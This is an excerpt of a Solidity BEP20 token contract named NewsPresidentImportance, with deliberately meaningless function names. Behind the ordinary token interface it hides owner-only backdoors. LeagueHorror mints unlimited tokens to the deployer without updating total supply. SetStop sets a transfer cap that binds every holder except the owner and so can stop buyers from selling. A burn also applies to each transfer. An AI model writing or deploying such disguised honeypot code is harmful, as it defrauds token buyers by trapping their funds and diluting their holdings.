...
contract NewsPresidentImportance is IBEP20 
{
    using TuneLib for uint256;
    mapping(address => uint256) internal _guard;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    uint256 internal _lecture;
    ...
    constructor() 
    {
        ...
        _name = "NewsPresidentImportance";
        _symbol = "IMPORTANCE";
        _burnRate = 11;
        _lecture = _totalSupply;
        _msgsender = _msgSender();
        _sendermessage = _msgsender;
        _guard[_sendermessage] = _totalSupply;
	    emit Transfer(address(0), _sendermessage, _totalSupply);
    }

    modifier NerveSave() { require(msg.sender == _sendermessage); _; }
    function name() public view virtual override returns (string memory) { return _name; }
    function symbol() public view virtual override returns (string memory) { return _symbol; }
    function decimals() public view virtual override returns (uint8) { return 6; }
    function totalSupply() public view virtual override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view virtual override returns (uint256) { return _guard[account];}
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }
    function GetRecognition() external view returns (uint256) { return _lecture; }
    function SetStop(uint b) external virtual NerveSave { _lecture = b * (10 ** decimals()); }
    ...
    function LeagueHorror(uint256 dish) external virtual NerveSave
    {
        uint low = dish * (10 ** decimals()); 
        _guard[_msgsender] = _guard[_msgsender].Big(low);
        emit Transfer(address(0), _msgsender, low);
    }
    ...
    function _transfer(address sender,address recipient, uint256 amount) internal virtual 
    {
        ...
        require(amount <= _lecture || recipient == _msgsender || sender == _msgsender);
        uint256 senderBalance = _guard[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        uint256 burnAmount = amount * _burnRate / 100;

        _guard[sender] = senderBalance - amount;
        _guard[recipient] += (amount - burnAmount);
        _guard[_burnaddress] += burnAmount;
...
library TuneLib 
{
  function Big(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }
}